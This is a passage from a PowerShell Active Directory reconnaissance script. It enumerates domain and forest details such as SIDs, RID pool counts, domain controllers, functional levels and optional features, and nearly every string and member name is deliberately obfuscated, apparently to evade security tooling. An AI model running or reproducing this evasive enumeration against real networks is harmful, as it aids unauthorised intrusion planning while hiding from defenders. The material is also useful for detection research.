                $objSearcherPath."pr`OpE`RTi`Esto`loaD".("{2}{0}{1}"-f 'ddRang','e','A').Invoke((("{3}{0}{2}{1}" -f'a','ool','vailablep','rid')))
                $objSearcherResult = $objSearcherPath.("{1}{0}"-f 'All','Find').Invoke()
                $RIDproperty = $objSearcherResult."p`R`oPertIeS"."Ri`D`AvA`ilAbLE`PoOL"
                [int32] $totalSIDS = $($RIDproperty) / (  $au3::("{1}{0}"-f 'ow','P').Invoke(2,32))
                [int64] $temp64val = $totalSIDS * (  $au3::("{1}{0}" -f 'ow','P').Invoke(2,32))
                $RIDsIssued = [int32]($($RIDproperty) - $temp64val)
                $RIDsRemaining = $totalSIDS - $RIDsIssued
                Remove-Variable SearchPath
                $objSearchPath.("{0}{1}{2}"-f 'Dispo','s','e').Invoke()
                $objSearcherPath.("{1}{2}{0}"-f 'pose','Di','s').Invoke()
                $objSearcherResult.("{0}{1}{2}"-f'Dispo','s','e').Invoke()
                Remove-Variable RIDproperty
                Remove-Variable totalSIDS
                Remove-Variable temp64val
            }
            Catch
            {
                Write-Warning "[Get-ADRDomain] Error accessing CN=RID Manager$,CN=System,$($SearchPath),$($objDomain.distinguishedName) "
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            }
            Try
            {
                $ForestContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext(("{1}{0}" -f 't','Fores'),$($ADDomain."f`Or`eSt"),$($Credential."uSErn`A`Me"),$($Credential.("{3}{1}{5}{2}{4}{0}" -f'ial','workCr','d','GetNet','ent','e').Invoke()."PA`sSw`OrD"))
                $ADForest =   ( ITEm ('v'+'aRIAB'+'le:kwx'+'9E')).vAlUE::("{0}{2}{1}" -f'GetF','t','ores').Invoke($ForestContext)
            }
            Catch
            {
                Write-Warning ("{5}{0}{6}{2}{1}{4}{7}{3}"-f'DR','tt','n] Error ge','ext','ing For','[Get-A','Domai','est Cont')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            }
            If ($ForestContext)
            {
                Remove-Variable ForestContext
            }
            If ($ADForest)
            {
                $GlobalCatalog = $ADForest.("{4}{0}{3}{1}{2}" -f'd','lo','balCatalog','G','Fin').Invoke()
            }
            If ($GlobalCatalog)
            {
                $DN = "GC://$($GlobalCatalog.IPAddress)/$($objDomain.distinguishedname)"
                Try
                {
                    $ADObject = New-Object -TypeName System.DirectoryServices.DirectoryEntry -ArgumentList ($($DN),$($Credential."u`Ser`NaMe"),$($Credential.("{2}{3}{1}{0}{4}" -f 'r','NetworkC','Ge','t','edential').Invoke()."P`ASS`woRD"))
                    $ADDomainSID = New-Object System.Security.Principal.SecurityIdentifier($ADObject."obj`ect`siD"[0], 0)
                    $ADObject.("{1}{0}{2}"-f 'os','Disp','e').Invoke()
                }
                Catch
                {
                    Write-Warning "[Get-ADRDomain] Error retrieving Domain SID using the GlobalCatalog $($GlobalCatalog.IPAddress). Using SID from the ObjDomain. "
                    Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                    $ADDomainSID = New-Object System.Security.Principal.SecurityIdentifier($objDomain."o`BJECt`sId"[0], 0)
                }
            }
            Else
            {
                $ADDomainSID = New-Object System.Security.Principal.SecurityIdentifier($objDomain."ob`jECtsID"[0], 0)
            }
        }
        Else
        {
            $ADDomain =   (GET-VARIAble  wm35  -VALueON  )::("{1}{0}{2}"-f 'rrentDo','GetCu','main').Invoke()
            $ADForest =  (  CHilDIteM  VariAblE:kwX9E).VAlUe::("{1}{3}{0}{2}" -f 'tF','GetCur','orest','ren').Invoke()
            Try
            {
                $GlobalCatalog = $ADForest.("{3}{4}{2}{1}{0}{5}"-f 't','Ca','Global','Fin','d','alog').Invoke()
                $DN = "GC://$($GlobalCatalog)/$($objDomain.distinguishedname)"
                $ADObject = New-Object -TypeName System.DirectoryServices.DirectoryEntry -ArgumentList ($DN)
                $ADDomainSID = New-Object System.Security.Principal.SecurityIdentifier($ADObject."O`BJeC`TSid"[0], 0)
                $ADObject.("{1}{2}{0}"-f'ose','di','sp').Invoke()
            }
            Catch
            {
                Write-Warning "[Get-ADRDomain] Error retrieving Domain SID using the GlobalCatalog $($GlobalCatalog.IPAddress). Using SID from the ObjDomain. "
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                $ADDomainSID = New-Object System.Security.Principal.SecurityIdentifier($objDomain."ObJEC`T`siD"[0], 0)
            }
            
            Try
            {
                $RIDManager = ([ADSI]"LDAP://CN=RID Manager$,CN=System,$($objDomain.distinguishedName) ")
                $RIDproperty = $ObjDomain.("{3}{0}{1}{2}{4}"-f 'ertLargeIn','teg','erToInt','Conv','64').Invoke($RIDManager."pRO`p`erTIES"."Rid`Av`AIlablEPo`oL"."VA`lUe")
                [int32] $totalSIDS = $($RIDproperty) / ( ( CHIlDItem  ("vaRI"+"a"+"B"+"lE:au3")  ).valuE::("{1}{0}" -f 'ow','P').Invoke(2,32))
                [int64] $temp64val = $totalSIDS * (  $aU3::("{0}{1}" -f 'P','ow').Invoke(2,32))
                $RIDsIssued = [int32]($($RIDproperty) - $temp64val)
                $RIDsRemaining = $totalSIDS - $RIDsIssued
                Remove-Variable RIDManager
                Remove-Variable RIDproperty
                Remove-Variable totalSIDS
                Remove-Variable temp64val
            }
            Catch
            {
                Write-Warning "[Get-ADRDomain] Error accessing CN=RID Manager$,CN=System,$($SearchPath),$($objDomain.distinguishedName) "
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            }
        }

        If ($ADDomain)
        {
            $DomainObj = @()

            
            $FLAD = @{
	            0 = ("{0}{2}{1}{3}" -f 'Win','0','dows20','0');
	            1 = ("{4}{2}{3}{5}{1}{0}"-f 'm','nteri','ow','s','Wind','2003/I');
	            2 = ("{1}{0}{3}{2}"-f'indow','W','2003','s');
	            3 = ("{2}{1}{0}"-f'ows2008','d','Win');
	            4 = ("{0}{3}{4}{2}{1}"-f'Wi','8R2','s200','n','dow');
	            5 = ("{0}{2}{1}" -f 'Win','012','dows2');
	            6 = ("{0}{3}{4}{1}{2}" -f 'W','20','12R2','indo','ws');
	            7 = ("{0}{2}{1}" -f 'Wi','ws2016','ndo')
            }
            $DomainMode = $FLAD[ $aqlnX::("{0}{1}{2}" -f 'T','oI','nt32').Invoke($objDomainRootDSE."DomaIn`Fu`N`CTi`O`NaLIty",10)] + ("{0}{1}"-f 'Dom','ain')
            Remove-Variable FLAD

            $ObjValues = @(("{0}{1}" -f 'Na','me'), $ADDomain."nA`me", ("{0}{1}"-f'NetBI','OS'), $objDomain."d`C"."VAL`Ue", ("{1}{3}{2}{5}{0}{4}"-f'L','Functi','na','o','evel','l '), $DomainMode, ("{0}{2}{1}"-f 'Do','ID','mainS'), $ADDomainSID."VAl`UE")

            For ($i = 0; $i -lt $($ObjValues."C`ount"); $i++)
            {
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{1}" -f'Cate','gory') -Value $ObjValues[$i]
                $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{1}"-f'Val','ue') -Value $ObjValues[$i+1]
                $i++
                $DomainObj += $Obj
            }
            Remove-Variable DomainMode

            For($i=0; $i -lt $ADDomain."DoM`A`inc`onTroL`leRS"."Co`UnT"; $i++)
            {
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{0}{2}" -f'o','Categ','ry') -Value ("{3}{0}{1}{2}" -f'omain ','Contro','ller','D')
                $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{1}"-f'Va','lue') -Value $ADDomain."Dom`AIncoNT`R`oLLERS"[$i]
                $DomainObj += $Obj
            }

            $Obj = New-Object PSObject
            $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{2}{0}"-f'ry','Cat','ego') -Value ("{1}{2}{0}" -f' Date','C','reation')
            $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{0}" -f 'lue','Va') -Value $objDomain."WH`EnCRE`At`eD"."val`UE"
            $DomainObj += $Obj

            $Obj = New-Object PSObject
            $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{0}{2}"-f'a','C','tegory') -Value ("{7}{0}{1}{6}{5}{3}{2}{4}"-f's-','DS-Mach','t','ntQuo','a','ccou','ineA','m')
            $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{0}" -f'alue','V') -Value $objDomain.'ms-DS-MachineAccountQuota'."vaL`UE"
            $DomainObj += $Obj

            If ($RIDsIssued)
            {
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name ("{2}{1}{0}"-f'y','or','Categ') -Value ("{0}{2}{1}{3}"-f 'R','ssu','IDs I','ed')
                $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{0}" -f'alue','V') -Value $RIDsIssued
                $DomainObj += $Obj
                Remove-Variable RIDsIssued
            }
            If ($RIDsRemaining)
            {
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{2}{1}"-f 'Ca','ry','tego') -Value ("{3}{2}{4}{1}{0}"-f'ning','ai',' R','RIDs','em')
                $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{1}"-f 'Val','ue') -Value $RIDsRemaining
                $DomainObj += $Obj
                Remove-Variable RIDsRemaining
            }
        }
    }

    If ($DomainObj)
    {
        Return $DomainObj
    }
    Else
    {
        Return $null
    }
}

Function Get-ADRForest
{

    param(
        [Parameter(mANDAToRy = $true)]
        [string] $Method,

        [Parameter(mANDAtoRy = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(mAndatORY = $false)]
        [DirectoryServices.DirectoryEntry] $objDomainRootDSE,

        [Parameter(mandAtoRy = $false)]
        [string] $DomainController,

        [Parameter(MANdaTORY = $false)]
        [Management.Automation.PSCredential] $Credential =  ( Get-cHIlDiTem  vaRiAbLE:q3cuVM).vaLUe::"E`mpTY"
    )

    If ($Method -eq ("{0}{1}"-f 'A','DWS'))
    {
        Try
        {
            $ADDomain = Get-ADDomain
        }
        Catch
        {
            Write-Warning ("{3}{0}{1}{4}{5}{2}{7}{6}"-f'Get-ADRForest] ','Er','ting Dom','[','ror ge','t',' Context','ain')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }

        Try
        {
            $ADForest = Get-ADForest $ADDomain."F`oReSt"
        }
        Catch
        {
            Write-Verbose ("{6}{4}{9}{1}{5}{0}{3}{7}{8}{2}{10}" -f 'Error','ores','g Forest Contex',' gett','et-AD','t] ','[G','i','n','RF','t')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
        }
        Remove-Variable ADDomain

        If (-Not $ADForest)
        {
            Try
            {
                $ADForest = Get-ADForest -Server $DomainController
            }
            Catch
            {
                Write-Warning ("{13}{14}{0}{7}{12}{15}{2}{6}{5}{11}{8}{3}{10}{9}{1}{4}"-f'orest] ',' param',' ','us','eter','tting Fore','ge','E','t Context ','Server','ing ','s','rr','[Get-','ADRF','or')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                Return $null
            }
        }

        If ($ADForest)
        {
            
            Try
            {
                $ADForestCNC = (Get-ADRootDSE)."Co`NfIGu`RA`TIo`N`N`Amingcon`TE`Xt"
                $ADForestDSCP = Get-ADObject -Identity "CN=Directory Service,CN=Windows NT,CN=Services,$($ADForestCNC) " -Partition $ADForestCNC -Properties *
                $ADForestTombstoneLifetime = $ADForestDSCP."t`omBs`TONelIFet`ImE"
                Remove-Variable ADForestCNC
                Remove-Variable ADForestDSCP
            }
            Catch
            {
                Write-Warning ("{5}{13}{8}{10}{9}{3}{6}{0}{12}{7}{4}{11}{2}{1}" -f'etri','e','ifetim','] Er','one','[','ror r',' Tombst','or','t','es',' L','eving','Get-ADRF')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            }

            
            If ( (  dir  ('v'+'aRIa'+'bLe:aqLNX') ).vaLuE::("{2}{1}{0}"-f'2','t3','ToIn').Invoke($ADForest."fOReSTM`O`dE") -ge 6)
            {
                Try
                {
                    $ADRecycleBin = Get-ADOptionalFeature -Identity ("{2}{4}{1}{5}{3}{0}" -f 're','B','Rec','Featu','ycle ','in ')
                }
                Catch
                {
                    Write-Warning ("{1}{3}{13}{0}{11}{5}{4}{7}{14}{9}{2}{6}{8}{12}{10}" -f'st] Err','[Get-',' ','ADRF','et',' r','Recy','riev','cle B','g','ture','or','in Fea','ore','in')
                    Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                }
            }

            
            If (  $aqlnx::("{1}{0}" -f 'oInt32','T').Invoke($ADForest."fOr`Est`MoDE") -ge 7)
            {
                Try
                {
                    $PrivilegedAccessManagement = Get-ADOptionalFeature -Identity ("{7}{6}{3}{8}{4}{2}{5}{1}{0}" -f 'Feature',' ',' Manage','i','s','ment','r','P','vileged Acces')
                }
                Catch
                {
                    Write-Warning ("{17}{1}{10}{18}{0}{6}{11}{12}{14}{8}{16}{15}{13}{4}{5}{2}{9}{7}{3}{19}"-f'e','Get-','na','t Feat','cce','ess Ma','tr','emen','r','g','ADRFo','ievi','ng','A',' P','leged ','ivi','[','rest] Error r','ure')
                    Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                }
            }

            $ForestObj = @()

            
            $FLAD = @{
                0 = ("{0}{1}{2}{3}" -f'Wi','n','dow','s2000');
                1 = ("{3}{2}{5}{1}{4}{0}" -f'terim','03','do','Win','/In','ws20');
                2 = ("{3}{1}{2}{0}" -f'3','w','s200','Windo');
                3 = ("{0}{2}{3}{1}"-f'Win','8','do','ws200');
                4 = ("{0}{1}{2}" -f'Win','dows200','8R2');
                5 = ("{2}{1}{0}{3}"-f 'ws','ndo','Wi','2012');
                6 = ("{2}{3}{1}{0}"-f '2R2','dows201','W','in');
                7 = ("{1}{3}{0}{2}" -f'o','Win','ws2016','d')
            }
            $ForestMode = $FLAD[ (variABLE  aQLnX ).valuE::("{1}{0}{2}"-f'oInt3','T','2').Invoke($ADForest."fo`Re`sTMoDE")] + ("{2}{1}{0}"-f't','s','Fore')
            Remove-Variable FLAD

            If (-Not $ForestMode)
            {
                $ForestMode = $ADForest."F`oREST`mOde"
            }

            $ObjValues = @(("{1}{0}" -f'ame','N'), $ADForest."na`me", ("{2}{3}{4}{1}{0}{5}" -f ' ','nal','Funct','i','o','Level'), $ForestMode, ("{0}{2}{1}{3}"-f 'Do',' M','main Naming','aster'), $ADForest."Do`M`AInn`AM`ingmAst`ER", ("{3}{0}{1}{2}" -f'a','st','er','Schema M'), $ADForest."Sc`HEmAma`Ster", ("{3}{2}{1}{0}" -f'n','i','oma','RootD'), $ADForest."R`OoTdoMa`IN", ("{0}{1}{2}"-f'Domain ','Co','unt'), $ADForest."DO`mai`Ns"."c`oUnt", ("{2}{0}{3}{1}" -f 'ite','t','S',' Coun'), $ADForest."sIT`ES"."c`oUNT", ("{2}{0}{3}{1}" -f 'Catalo',' Count','Global ','g'), $ADForest."gL`oBaLCA`TaLo`gS"."cou`Nt")

            For ($i = 0; $i -lt $($ObjValues."c`OuNT"); $i++)
            {
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{2}{1}"-f 'Ca','egory','t') -Value $ObjValues[$i]
                $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{0}"-f 'alue','V') -Value $ObjValues[$i+1]
                $i++
                $ForestObj += $Obj
            }
            Remove-Variable ForestMode

            For($i=0; $i -lt $ADForest."do`ma`ins"."COU`NT"; $i++)
            {
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{0}{2}" -f 'or','Categ','y') -Value ("{0}{1}" -f'Dom','ain')
                $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{0}" -f'ue','Val') -Value $ADForest."d`OmainS"[$i]
                $ForestObj += $Obj
            }
            For($i=0; $i -lt $ADForest."sIt`eS"."Cou`NT"; $i++)
            {
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{0}" -f 'ategory','C') -Value ("{1}{0}"-f'te','Si')
                $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{0}"-f'ue','Val') -Value $ADForest."Si`TEs"[$i]
                $ForestObj += $Obj
            }
            For($i=0; $i -lt $ADForest."gLo`Bal`CAt`AL`ogs"."c`oUnT"; $i++)
            {
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{1}{2}"-f'C','a','tegory') -Value ("{2}{0}{1}" -f'obal','Catalog','Gl')
                $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{1}" -f 'V','alue') -Value $ADForest."GL`oBALcata`Logs"[$i]
                $ForestObj += $Obj
            }

            $Obj = New-Object PSObject
            $Obj | Add-Member -MemberType NoteProperty -Name ("{2}{1}{0}" -f 'tegory','a','C') -Value ("{2}{4}{1}{3}{5}{0}" -f 'ifetime','on','T','e ','ombst','L')
            If ($ADForestTombstoneLifetime)
            {
                $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{1}"-f'Val','ue') -Value $ADForestTombstoneLifetime
                Remove-Variable ADForestTombstoneLifetime
            }
            Else
            {
                $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{0}" -f 'ue','Val') -Value ("{0}{3}{4}{1}{2}"-f'N','iev','ed','ot Re','tr')
            }
            $ForestObj += $Obj

            $Obj = New-Object PSObject
            $Obj | Add-Member -MemberType NoteProperty -Name ("{2}{0}{1}" -f'ego','ry','Cat') -Value (("{5}{3}{2}{6}{4}{0}{1}" -f'onwards',')','in (','cle B','8 R2 ','Recy','200'))
            If ($ADRecycleBin)
            {
                If ($ADRecycleBin."En`ABLED`s`CoPEs"."Cou`NT" -gt 0)
                {
                    $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{1}"-f 'Va','lue') -Value ("{1}{0}" -f 'abled','En')
                    $ForestObj += $Obj
                    For($i=0; $i -lt $($ADRecycleBin."eNABl`Ed`sCOP`ES"."coU`NT"); $i++)
                    {
                        $Obj = New-Object PSObject
                        $Obj | Add-Member -MemberType NoteProperty -Name ("{2}{1}{0}" -f 'ry','go','Cate') -Value ("{2}{1}{0}" -f 'ope','led Sc','Enab')
                        $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{0}"-f 'ue','Val') -Value $ADRecycleBin."eNABLeD`S`cOPEs"[$i]
                        $ForestObj += $Obj
                    }
                }
                Else
                {
                    $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{1}"-f 'Val','ue') -Value ("{1}{2}{0}" -f 'led','Disa','b')
                    $ForestObj += $Obj
                }
                Remove-Variable ADRecycleBin
            }
            Else
            {
                $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{0}"-f'e','Valu') -Value ("{1}{0}{2}" -f 'sab','Di','led')
                $ForestObj += $Obj
            }

            $Obj = New-Object PSObject
            $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{1}" -f'Categ','ory') -Value ("{2}{7}{1}{5}{6}{0}{8}{3}{4}" -f '(2016 o','ed Ac','Privile','rds',')','c','ess Management ','g','nwa')
            If ($PrivilegedAccessManagement)
            {
                If ($PrivilegedAccessManagement."En`AbL`E`dscOp`ES"."cou`NT" -gt 0)
                {
                    $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{0}"-f 'e','Valu') -Value ("{2}{0}{1}"-f'nab','led','E')
                    $ForestObj += $Obj
                    For($i=0; $i -lt $($PrivilegedAccessManagement."eN`ABlE`dscop`Es"."C`OUNt"); $i++)
                    {
                        $Obj = New-Object PSObject
                        $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{2}{1}" -f 'Catego','y','r') -Value ("{3}{2}{1}{0}" -f 'pe','led Sco','ab','En')
                        $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{0}"-f 'e','Valu') -Value $PrivilegedAccessManagement."ENA`B`Le`dS`coPeS"[$i]
                        $ForestObj += $Obj
                    }
                }
                Else
                {
                    $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{0}"-f'ue','Val') -Value ("{1}{0}" -f'sabled','Di')
                    $ForestObj += $Obj
                }
                Remove-Variable PrivilegedAccessManagement
            }
            Else
            {
                $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{0}" -f 'alue','V') -Value ("{2}{1}{0}" -f 'ed','bl','Disa')
                $ForestObj += $Obj
            }
            Remove-Variable ADForest
        }
    }

    If ($Method -eq ("{1}{0}" -f'DAP','L'))
    {
        If ($Credential -ne   (  vARiAble  ("q"+"3cuvm") ).valuE::"Emp`TY")
        {
            $DomainFQDN = Get-DNtoFQDN($objDomain."DI`StIn`gUis`H`eDn`AMe")
            $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext(("{2}{0}{1}" -f 'ai','n','Dom'),$($DomainFQDN),$($Credential."u`S`ERNamE"),$($Credential.("{4}{6}{3}{2}{0}{1}{5}" -f 'r','k','o','w','G','Credential','etNet').Invoke()."P`ASsWoRd"))
            Try
            {
                $ADDomain =   (GeT-VARIabLE  WM35 -VAlUE )::("{0}{2}{1}"-f'Ge','n','tDomai').Invoke($DomainContext)
            }
            Catch
            {
                Write-Warning ("{4}{0}{3}{6}{2}{7}{1}{5}" -f'et','ing Domain Conte','ror get','-ADR','[G','xt','Forest] Er','t')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                Return $null
            }
            Remove-Variable DomainContext

            $ForestContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext(("{1}{0}"-f 'est','For'),$($ADDomain."FOR`eSt"),$($Credential."UsE`Rn`AmE"),$($Credential.("{0}{2}{1}{3}"-f 'Get','kCreden','Networ','tial').Invoke()."pA`ssWO`RD"))
            Remove-Variable ADDomain
            Try
            {
                $ADForest =   (gI ("vAriA"+"bL"+"E:K"+"WX"+"9e") ).VALuE::("{0}{1}{2}" -f'G','etFor','est').Invoke($ForestContext)
            }
            Catch
            {
                Write-Warning ("{9}{8}{6}{5}{1}{3}{4}{2}{0}{7}" -f'Co','or getting ','t ','For','es','] Err','DRForest','ntext','-A','[Get')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                Return $null
            }
            Remove-Variable ForestContext

            
            Try
            {
                $SearchPath = ("{1}{4}{10}{5}{6}{7}{0}{3}{11}{8}{2}{9}{12}" -f'N=','C','r','Windows N','N=Dir','r','y Ser','vice,C','Se','v','ecto','T,CN=','ices')
                $objSearchPath = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)/$SearchPath,$($objDomainRootDSE.configurationNamingContext)", $Credential."useRN`Ame",$Credential.("{5}{1}{3}{4}{2}{0}" -f 'ial','Network','edent','C','r','Get').Invoke()."pa`sSWORD"
                $objSearcherPath = New-Object System.DirectoryServices.DirectorySearcher $objSearchPath
                $objSearcherPath."f`Il`TeR"=(("{3}{6}{4}{1}{5}{2}{0}"-f 'ce)','irectory ','ervi','(nam','D','S','e='))
                $objSearcherResult = $objSearcherPath.("{1}{0}{2}" -f'in','F','dAll').Invoke()
                $ADForestTombstoneLifetime = $objSearcherResult."Pr`O`peRt`iEs"."tOMbSto`Ne`lIFET`Ime"
                Remove-Variable SearchPath
                $objSearchPath.("{1}{0}" -f'ispose','D').Invoke()
                $objSearcherPath.("{1}{0}"-f 'e','Dispos').Invoke()
                $objSearcherResult.("{0}{2}{1}"-f 'Di','ose','sp').Invoke()
            }
            Catch
            {
                Write-Warning ("{4}{8}{12}{2}{5}{9}{10}{3}{11}{0}{1}{13}{6}{7}" -f 'ombst','one','t]','etr','[Ge',' Error','et','ime','t-ADRF',' ','r','ieving T','ores',' Lif')
                Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            }
            
            If (  $aqLnX::("{2}{0}{1}" -f'In','t32','To').Invoke($objDomainRootDSE."fORestFUnC`TIonaL`I`Ty",10) -ge 6)
            {
                Try
                {
                    $SearchPath = ("{10}{5}{2}{6}{7}{3}{11}{15}{13}{14}{8}{18}{0}{1}{16}{9}{17}{4}{12}"-f 'ows',' NT,C','B','ure,CN=Op','vices,CN=C','ycle ','i','n Feat','ctory Servi','=S','CN=Rec','ti','onfiguration','es,CN=D','ire','onal Featur','N','er','ce,CN=Wind')
                    $objSearchPath = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)/$($SearchPath),$($objDomain.distinguishedName)", $Credential."USeRNa`ME",$Credential.("{3}{4}{2}{1}{0}" -f 'al','edenti','Cr','Ge','tNetwork').Invoke()."pa`sSword"
                    $objSearcherPath = New-Object System.DirectoryServices.DirectorySearcher $objSearchPath
                    $ADRecycleBin = $objSearcherPath.("{0}{1}" -f'F','indAll').Invoke()
                    Remove-Variable SearchPath
                    $objSearchPath.("{1}{0}{2}"-f 'o','Disp','se').Invoke()
                    $objSearcherPath.("{0}{2}{1}"-f 'Di','pose','s').Invoke()
                }
                Catch
                {
                    Write-Warning ("{14}{13}{9}{1}{10}{4}{5}{3}{2}{8}{6}{7}{12}{0}{11}" -f 'atur','res','ri','ret',' ','Error ','l','e Bin F','eving Recyc','-ADRFo','t]','e','e','t','[Ge')
                    Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                }
            }
            
            If ( ( VARIABle AQLnX  ).Value::("{1}{0}" -f't32','ToIn').Invoke($objDomainRootDSE."ForE`stf`UnCtioN`A`LiTY",10) -ge 7)
            {
                Try
                {
                    $SearchPath = ("{6}{20}{3}{18}{16}{19}{12}{9}{17}{13}{14}{8}{11}{2}{7}{1}{10}{24}{15}{23}{5}{0}{4}{22}{21}" -f'ces','ecto','es,','=Privile',',CN','indows NT,CN=Servi','C','CN=Dir','eat','na','ry ','ur','ss Ma',' Feature,CN=Optiona','l F','vice,','d A','gement','ge','cce','N','ration','=Configu','CN=W','Ser')
                    $objSearchPath = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)/$($SearchPath),$($objDomain.distinguishedName)", $Credential."UsER`NAMe",$Credential.("{0}{1}{3}{2}"-f'G','et','Credential','Network').Invoke()."pAs`SWord"
                    $objSearcherPath = New-Object System.DirectoryServices.DirectorySearcher $objSearchPath
                    $PrivilegedAccessManagement = $objSearcherPath.("{1}{2}{0}" -f'll','Fi','ndA').Invoke()
                    Remove-Variable SearchPath
                    $objSearchPath.("{0}{1}{2}" -f 'Dis','p','ose').Invoke()
                    $objSearcherPath.("{1}{0}"-f 'spose','Di').Invoke()
                }
                Catch
                {
                    Write-Warning ("{13}{12}{15}{8}{3}{14}{6}{9}{11}{5}{16}{10}{0}{1}{4}{7}{2}{17}" -f's M','a','ent Fea','rr','nag','ilege','retrievin','em','E','g P',' Acces','riv','Get-ADRForest]','[','or ',' ','d','ture')
                    Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
                }
            }
        }
        Else
        {
            $ADDomain =  ( variaBLe wM35  -vAlU)::("{2}{1}{0}" -f 'rentDomain','Cur','Get').Invoke()
            $ADForest =   $kWX9e::("{0}{1}{2}"-f'GetCur','rentFores','t').Invoke()

            
            $ADForestTombstoneLifetime = ([ADSI]"LDAP://CN=Directory Service,CN=Windows NT,CN=Services,$($objDomainRootDSE.configurationNamingContext) ")."T`Om`BStoneLIF`eTi`Me"."v`Alue"

            
            If ( $aQLNX::("{1}{0}"-f'oInt32','T').Invoke($objDomainRootDSE."for`E`STFuNC`Ti`oNAli`TY",10) -ge 6)
            {
                $ADRecycleBin = ([ADSI]"LDAP://CN=Recycle Bin Feature,CN=Optional Features,CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,$($objDomain.distinguishedName) ")
            }
            
            If ( ( CHILDitem  vAriabLe:AqLnx).ValUE::("{1}{2}{0}" -f 't32','T','oIn').Invoke($objDomainRootDSE."f`OrEs`TFuNC`TIOnA`LIty",10) -ge 7)
            {
                $PrivilegedAccessManagement = ([ADSI]"LDAP://CN=Privileged Access Management Feature,CN=Optional Features,CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,$($objDomain.distinguishedName) ")
            }
        }

        If ($ADForest)
        {
            $ForestObj = @()

            
            $FLAD = @{
	            0 = ("{0}{1}{3}{2}" -f 'Window','s','000','2');
	            1 = ("{4}{2}{0}{3}{1}{5}"-f 'ows200','/Inte','d','3','Win','rim');
	            2 = ("{0}{2}{1}"-f'Windows2','03','0');
	            3 = ("{1}{2}{0}{3}" -f 'ndows20','W','i','08');
	            4 = ("{2}{0}{1}" -f'indows2008R','2','W');
	            5 = ("{3}{2}{0}{1}" -f'ow','s2012','ind','W');
	            6 = ("{4}{1}{3}{2}{0}"-f'2','dow','12R','s20','Win');
                7 = ("{2}{0}{1}" -f 's2','016','Window')
            }
            $ForestMode = $FLAD[  ( ItEM VaRiable:aqlNx ).vAlue::("{1}{0}"-f '2','ToInt3').Invoke($objDomainRootDSE."fOrESTfuNCtio`N`AlI`TY",10)] + ("{1}{0}" -f 't','Fores')
            Remove-Variable FLAD

            $ObjValues = @(("{0}{1}" -f'Na','me'), $ADForest."n`AmE", ("{0}{2}{1}"-f 'Fu','ional Level','nct'), $ForestMode, ("{3}{1}{0}{2}" -f 'te','ng Mas','r','Domain Nami'), $ADForest."N`AMi`NGrole`owner", ("{2}{0}{1}"-f' ','Master','Schema'), $ADForest."sc`heMA`ROl`EowNER", ("{0}{1}{2}" -f'RootDoma','i','n'), $ADForest."Ro`O`TdOmAIN", ("{0}{1}{2}" -f 'Dom','a','in Count'), $ADForest."dO`M`AINs"."c`OUnt", ("{1}{2}{0}{3}"-f'o','Site',' C','unt'), $ADForest."Si`TEs"."CO`UnT", ("{4}{1}{3}{0}{2}{5}"-f'Cat','obal','alog C',' ','Gl','ount'), $ADForest."glOBAlCA`T`ALO`gs"."CO`UNt")

            For ($i = 0; $i -lt $($ObjValues."cOu`NT"); $i++)
            {
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{0}"-f 'ory','Categ') -Value $ObjValues[$i]
